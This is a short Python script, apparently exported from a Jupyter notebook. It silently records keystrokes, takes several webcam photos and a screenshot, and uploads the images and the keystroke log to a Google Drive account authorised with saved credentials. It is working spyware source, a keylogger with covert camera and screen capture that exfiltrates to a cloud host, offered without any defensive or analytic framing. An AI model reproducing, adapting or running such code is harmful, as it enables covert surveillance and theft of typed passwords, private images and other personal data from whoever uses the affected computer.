#!/usr/bin/env python
# coding: utf-8

# In[ ]:


import cv2
import time
import pyautogui
import os
import keyboard
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive

log = open('log.txt',"r+")
keyboard.start_recording()
gauth = GoogleAuth()
gauth.LoadCredentialsFile("mycreds.txt")
if gauth.credentials is None:
    gauth.LocalWebserverAuth()
    print('rip')
elif gauth.access_token_expired:
    gauth.Refresh()
else:
    gauth.Authorize()
gauth.SaveCredentialsFile("mycreds.txt")
gauth.LocalWebserverAuth()

drive = GoogleDrive(gauth)
def show(mirror=False):
    f = 0
    cam = cv2.VideoCapture(0)
    while True:
        cam = cv2.VideoCapture(0)
        ret_val, img = cam.read()
        if mirror: 
            img = cv2.flip(img, 1)
    
        cv2.imwrite('hello'+str(f)+'.png',img)
        f = f+1
        cam.release() 
        time.sleep(30)
        if f==5:
            cam.release() 
            break
            
show(mirror=True)
myScreenshot = pyautogui.screenshot()
myScreenshot.save('hi.png')
file2 = drive.CreateFile()
file2 = drive.CreateFile()
file2.SetContentFile('hello1.png')
file2.Upload()
file2 = drive.CreateFile()
file2.SetContentFile('hello2.png')
file2.Upload()
file2 = drive.CreateFile()
file2.SetContentFile('hello3.png')
file2.Upload()
file2 = drive.CreateFile()
file2.SetContentFile('hello4.png')
file2.Upload()
file2 = drive.CreateFile()
file2.SetContentFile('hi.png')
file2.Upload()
time.sleep(300)
for L in keyboard.stop_recording():
    log.write(str(L)+'\n')
log.close()
file2 = drive.CreateFile()
file2.SetContentFile('log.txt')
file2.Upload()


# In[ ]:




